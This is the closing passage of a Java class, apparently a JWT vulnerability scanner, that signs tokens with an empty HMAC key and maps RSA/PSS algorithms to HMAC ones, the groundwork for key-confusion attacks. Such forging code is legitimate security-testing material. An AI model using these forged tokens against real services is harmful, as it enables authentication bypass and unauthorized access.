                Mac mac = Mac.getInstance("HmacSHA256");
                SecretKeySpec secretKey = new SecretKeySpec(new byte[0], "HmacSHA256");
                mac.init(secretKey);
                byte[] signature = mac.doFinal(signingInput.getBytes(StandardCharsets.UTF_8));
                String encodedSignature = Base64.getUrlEncoder().withoutPadding().encodeToString(signature);
                
                return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + "." + encodedSignature;
            } catch (Exception e) {
                return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + ".NULL_KEY_SIGNATURE";
            }
            
        } catch (Exception e) {
            return "ERROR_GENERATING_NULL_PAYLOAD";
        }
    }
    
    // Utility methods
    
    private static String getCorrespondingHMACAlgorithm(String rsaAlgorithm) {
        switch (rsaAlgorithm) {
            case "RS256":
            case "PS256":
                return "HS256";
            case "RS384":
            case "PS384":
                return "HS384";
            case "RS512":
            case "PS512":
                return "HS512";
            default:
                return null;
        }
    }
    
    private static String getHMACAlgorithmName(String jwtAlgorithm) {
        switch (jwtAlgorithm) {
            case "HS256":
                return "HmacSHA256";
            case "HS384":
                return "HmacSHA384";
            case "HS512":
                return "HmacSHA512";
            default:
                throw new IllegalArgumentException("Unsupported HMAC algorithm: " + jwtAlgorithm);
        }
    }
    
    private static String addPadding(String base64url) {
        String padded = base64url;
        int padding = (4 - base64url.length() % 4) % 4;
        for (int i = 0; i < padding; i++) {
            padded += "=";
        }
        return padded;
    }
    
    private static String serializeToJson(Map<String, Object> map) {
        StringBuilder json = new StringBuilder();
        json.append("{");
        
        boolean first = true;
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            if (!first) {
                json.append(",");
            }
            first = false;
            
            json.append("\"").append(entry.getKey()).append("\":");
            
            Object value = entry.getValue();
            if (value instanceof String) {
                json.append("\"").append(value).append("\"");
            } else if (value instanceof Map) {
                json.append(serializeToJson((Map<String, Object>) value));
            } else {
                json.append(value.toString());
            }
        }
        
        json.append("}");
        return json.toString();
    }
    
    // Prevent instantiation
    private AdvancedVulnerabilityDetector() {}
}
